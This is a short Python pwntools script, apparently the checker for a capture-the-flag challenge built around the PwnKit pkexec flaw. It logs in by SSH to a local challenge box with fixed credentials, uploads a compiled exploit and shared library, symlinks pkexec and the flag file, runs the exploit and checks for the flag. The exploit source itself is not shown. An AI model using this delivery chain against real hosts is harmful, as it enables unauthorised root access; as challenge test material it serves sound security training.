#!/usr/bin/env python3

from tempfile import mkdtemp
from os import system
from os.path import join, dirname

from pwn import *

ROOT = dirname(__file__)

system("cd %s; make" % join(ROOT, "../exploit"))

s = ssh("sstf", "localhost", 8042, "sstf")
s.set_working_directory()
s.put(join(ROOT, "../exploit/x"))
s.put(join(ROOT, "../exploit/x.so"))
s.system("chmod +x ./x")
s.system("chmod +x ./x.so")
s.system("ln -s /home/pwnkit/flag .")
s.system("ln -s /home/pwnkit/pkexec .")

(out, _) = s.run_to_end("./x", tty=True)
flag = open(join(ROOT, "../deploy/flag"), "rb").read().strip()

if flag in out:
    print("[!] OK. (found: %s)" % flag)
else:
    print("[!] FAILED.\n%s" % out)

s.close()
